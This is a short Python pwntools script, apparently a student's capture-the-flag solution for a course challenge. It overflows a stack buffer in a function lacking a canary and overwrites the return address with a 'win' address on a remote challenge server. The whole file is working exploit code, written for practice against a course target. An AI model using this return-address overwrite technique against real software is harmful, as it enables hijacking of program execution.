# ssp-buffer-sizeex.py - Aidan Wech (Onyxymous)
from pwn import *

# ssh variables
host = 'cs4401shell.walls.ninja'
port = 23238

# exploit variables
winaddr = 0x55555555491a	# address of win
randfirstbuff = 40		# buff size of first buf, not important :P
cbuff = 88			# it was found that c() does not have a stack canary, so this is offset until return address

# process
p = remote(host, port)
p.recvline(timeout=1)
p.sendline(cyclic(randfirstbuff - 1))
p.sendline(b'c')

p.recvline(timeout=1)
p.sendline(flat({
cbuff: p64(winaddr+1)})) # skip the push instruction to realign the stack
p.recvall(timeout=1)
